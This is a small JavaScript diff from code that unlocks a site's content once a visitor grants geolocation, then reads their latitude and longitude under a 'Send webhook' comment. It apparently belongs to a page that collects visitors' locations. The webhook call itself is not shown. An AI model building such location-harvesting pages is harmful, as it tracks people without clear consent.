@@ -136,10 +136,10 @@
 	console.log("Location granted", position);
 
 	// Unlock site
-	(position) => {
+	
     overlay.style.display = "none";
     content.style.display = "block";
-	}
+		
 	// Send webhook
 	const lat = position.coords.latitude;
 	const lng = position.coords.longitude;
